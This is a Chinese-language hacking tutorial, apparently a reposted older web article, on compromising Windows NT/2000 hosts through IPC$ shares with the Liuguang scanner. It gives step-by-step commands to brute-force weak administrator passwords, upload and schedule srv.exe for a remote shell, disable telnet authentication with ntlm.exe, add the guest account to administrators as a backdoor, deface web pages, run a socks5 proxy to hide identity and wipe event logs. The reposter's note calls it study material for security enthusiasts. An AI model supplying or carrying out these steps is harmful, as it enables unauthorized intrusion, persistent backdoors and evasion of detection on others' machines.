## IPC$ 探测 — 流光基础教程

IPC : interprocess communications
准确说 是 IPC$  是默认的在系统启动时候的 admin 共享.

是 windowsNT / 2k 特有的 远程网络管理登录功能

特点是: 同一时间内 两个 IP 之间 只允许建立一个连接.

试图通过 ipc$ 连接 会在 ecentlog 中留下记录. 不管你是否登录成功.



启动流光:
获得一台主机的管理权限  并将这个主机做成跳板,那么就可以用命中率高的办法来探测了.
即测试一批 IP 来获得弱口令.


在主界面选择“探测—探测 POP3/FTP/NT/SQL 主机”选项。或者直接按 CTRL+R，然后弹出 
“主机扫描设置”对话框。 

3：输入我们要破解的IP 段，在选项中我们把“frontpage”主机自动加入HTTP 主机列表取 
消。因为我们只想获得IPC 弱口令，这样可以加快扫描的速度，加入IP，选择扫描NT/98 主 
机，需要说明的是这里我们可以选择的还有很多，包括SQL/FTP/POP3 等等，灵活运用可以给 
我今后的探测工作带来很大的方便 

4：探测中„„ 
警告：如果你要探测的是流光保留的国内IP 段会被禁止的，也就是探测的时候信息栏会出 
现“IP 保留”的字样，免得初学HACKER 的你误伤国内的站点的同时给自己带来麻烦！ 

5：扫描到的NT/98 主机列表（我就不贴了） 

6：没有扫描到密码的，就不用看报告了 

7：有了 NT/98 的机器了，就可以正式开始 IPC$，右键点击谈探测的“IPC$主机—探测—探 
测所有IPC$用户列表”。或者按键盘的CTRL+F9 

8：注意下面两个复选框的设置，把两个都选上，因为我们只要 ipc$管理员的弱口令，而且 
只要有一个就可以了，然后点“选项”。 

9：点“选项”后，弹出“用户列表选项”对话框，为了加快弱口令扫描速度，我们把它全部 
取消，比如第二个选项，既然对方景致列出用户了，我想对于一个网管来说，弱口令可能性 
也是微乎其微的 


10：探测中„„很快就出现破解成功的提示，上面的FTP 主机（IP192.168.0.1）也有了相应 
的变化。 

11：又出现查看报告的窗口，这次有结果，当然要仔细看看 

12：有远程主机的管理密码了，我们剩下的就是想办法控制他了，有什么好办法呢？当然有 
很多了，比如在“工具——NT/IIS 工具”菜单下，这些我们以后在说，今天还是先练习NET 
命令吧，这样有利于我们了解这些命令究竟是在完成些什么样的功能 

13：目标是如何被黑的 
开个DOS 命令提示符窗口执行命令如下命令 “||”后面是说明 
1）net use \对方IPipc$“密码” /user：“用户名”||与对方建立ipc$ 远程连接 
2）copy icmd.exe \对方ipadmin$ ||admin$是对方的winnt 目录，这里存放文件多 
3）net time \对方ip ||查看对方的系统时间 
4）at \对方ip 程序启动的时间 启动程序名 启动程序的参数 ||用at 命令来定时启动程 
序，在这里我们用soon 这个程序来做也可以，它可以取代3/4 两步。 
5）tenlent 对方ip 端口 ||通过远程服务端口远程登陆目标主机 
6）输入pass（口令） ||如果不是就用icmd.exe，或者没有设置口令就不用了 
7）在开个窗口，继续copy我们要用的东西，copy sock.exe、copy ntlm.exe、copy vclear.exe。 
如果我们真的想黑了它，只需要把我们的首页文件覆盖目标的首页就OK 了。我们可以通过在 
跟目录执行dir /s default.htm 或者dir /s index.htm 来确定对方的首页的位置，一般是 
在X：interpubwwwroot 就可以用修改好的首页覆盖对方的首页 
8）其实黑人家是很不道德的而且违法的，我们最还是物有所值，做成跳板吧，今后干活方便 
点。执行我们copy 过去的ntlm.exe 取消登陆验证。再给自己留个后门，比如提升guest 的 
权限，或者其他的后门工具，这类东西有很多，自己选吧 
9）做个sock5 代理玩玩，用在QQ 上面不错哦 
执行我们copy 过去的sock -install,net start skserver ,看看用在QQ 上的效果，这样 
就可以隐藏自己的真实身份了，而且在局域网也可以通过服务器上QQ 了 
10）问题思考：还能够做成其它的吗？ 
当然了，只要你有时间，而且愿意做，一个个人专用的服务器在你面前，你想做什么都可 
以 


14：日志清除，断开连接： 
支持我们copy 过去的cl.exe clear.exe 都可以清除日志，比如clear all ：清除所有日 
志。然后断开连接：net use \对方 IPIPC$ /delete 这一步是必须的，尤其是在一些有争 
议的站点上，或者是国内的站点，除非你想让电视报导XXX 地区又捕获黑客一名XXX 







IPC$的定义：IPC$是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，在远程管理计算机和查看计算机的共享资源时使用。
IPC$的作用：利用IPC$可以与目标主机建立一个空的连接(无需用户名与密码)，而利用这个空的连接，我们就可以得到目标主机上的用户列表。用“流光”的IPC$探测功能，可以得到用户列表，并配合字典，进行密码尝试。
IPC$空连接主机步骤：
1、首先要扫到能建立IPC$空连接的主机，有了目标才能进攻，推荐使用安全焦点的xscan_gui v1.3，该软件使用方法很简单，而且速度快，也许还能扫出其他漏洞。
2、详细了解NET命令，做IPC$空连接主机是不可不知NET命令使用的。
3、如果知道对方的用户名和密码，就用下面这个命令：
net use \\127.0.0.1\ipc$ ”密码” /user:”用户名”
退出的命令是：
net use \\127.0.0.1\ipc$ /delte
4、大部分情况下我们都不知道对方机器的用户名和密码。这就需要知道他的IP，我们使用用ping命令，格式为：ping www.xxx.com(如果用QQ聊天更简单，现在好多QQ都显IP的)， 用追捕查他的操作系统，用户名等。现在信息都有了，然后大家试试弱智点的密码，如:123，12345，123456，用户名就是Administrator。运气好的话就可以进入了。
5、实在猜不出密码的话就只有用榕哥的大作――流光，运行探测――扫描POP3/FTP/NT/SQL主机，会出现“主机扫描设置”，在“扫描范围”中分别填写“开始地址”与“结束地址”，这步你可以选择要扫描的IP段，也可以只填某一IP，扫描主机类型”选择“NT/98”，然后开始扫描，如果单扫某一IP，我建议扫描主机类型选ALL，选项选中的内容不要取消，这样可以看看他的机器是什么颜色的，具体表示看下表：
红色：该主机安装了FrontPage扩展，并没有权限设置。如果扫到红色的，你可以打开FrontPage，在打开那里填上他的IP地址，接着你就知道怎么做了。
蓝色：表示该主机上安装了FrontPage扩展。
黑色：远程执行命令。你可以单击该主机――连接，就可以用DOS命令操作远程计算机，如:dir c:\\
黄色：直接下载对方SAM文件(SAM文件是NT下储存用户和密码的文件，下载后用LC3可以解开)。
绿色：将对方SAM文件上传到指定的FTP服务器。
6、现在知道了他主机的情况，就可以开始探测他的用户列表了！右键点IPC$主机－探测－探测所有IPC$用户列表，下面两个对话框的设置都选上，我们只要IPC$管理员的弱口令。在结果点击右键，探测用户列表，Administrstor(超级用户)直接探测到ADMIN的密码，如果实在不行，我们还可以拿其他用户“开刀”，然后在想办法让他变成超级用户。
7、得到用户名和密码我们就可以连接了。打开win2000下的cmd.exe(也就是命令提示符)。然后重复第二步教过的连接连接命令:
net use \\127.0.0.1\ipc$ ”密码” /user:”用户名”
成功连接后显示命令成功完成。
8、现在你可以用copy命令把你想要上传的东西放到他的机器里。
9、如果你想黑他页面的话就找到网页所在的目录，如:c:\inetpub\wwwroot，用命令：
copy c:\index.htm \\IP地址\c$\inetpub\wwwroot
这里的c:\index.htm指的是你作好的网页，上传替换掉原先的文件就可以改他的主页。
其他的操作方式就自己开发吧！以下提供几条有用的命令：
建立空连接
net use \\IP\ipc$ ”" /user:”"
建立非空连接
net use \\IP\ipc$ ”用户名” /user:”密码”
映射默认共享
net use z: \\IP\c$ ”密码” /user:”用户名” （即可将对方的c盘映射为自己的z盘，其他盘类推）
如果已经和目标建立了ipc$，则可以直接用IP+盘符+$访问,具体命令：
net use z: \\IP\c$
删除一个ipc$连接
net use \\IP\ipc$ /del
删除共享映射
net use c: /del 删除映射的c盘，其他盘类推
net use * /del 删除全部,会有提示要求按y确认
经典入侵示例
1.C:\>net use \\127.0.0.1\IPC$ ”" /user:”admintitrators”
这是用《流光》扫到的用户名为administrators，密码为”空”的IP地址，如果是打算攻击的话，就可以用这样的命令来与127.0.0.1建立一个连接，因为密码为”空”，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入administrators，命令即可成功完成。
2. C:\>copy srv.exe \\127.0.0.1\admin$
先复制srv.exe上去，在流光的Tools目录下就有（这里的$是指admin用户的c:\winnt\system32\，大家还可以使用c$、d$，意思是C盘与D盘，这看你要复制到什么地方去了）。
3.C:\>net time \\127.0.0.1
查查时间，发现127.0.0.1 的当前时间是2005/5/1上午11:00，命令成功完成。
4.C:\>at \\127.0.0.1 11:05 srv.exe
用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然无法启动）。
5.C:\>net time \\127.0.0.1
再查查到时间没有，如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备开始下面的命令。
6.C:\>telnet 127.0.0.1 99
这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的Shell。
虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了。
7.C:\>copy ntlm.exe \\127.0.0.1\admin$
用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。
8.C:\WINNT\system32\>ntlm
输入ntlm启动（这里的C:\WINNT\system32\>指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行）。当出现”DONE”的时候，就说明已经启动正常。然后使用”net start telnet”来开启Telnet服务！
9.Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作一样简单！然后你想做什么就做什么吧。
为了以防万一,我们再把guest激活加到管理组。
10.C:\>net user guest /active:yes
将对方的Guest用户激活。
11.C:\>net user guest 1234
将Guest的密码改为1234,或者你要设定的密码。
12.C:\>net localgroup administrators guest /add
将Guest变为Administrator (如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机) 。
其他操作就看您的能力和水平了，自己揣摩吧！
注：此为本人几年前收藏的经典网文，虽然好多命令和工具均已无法正常运行，但其思路和方法仍然值得网络安全爱好者学习，在此向原作者表示致敬！




流光5 
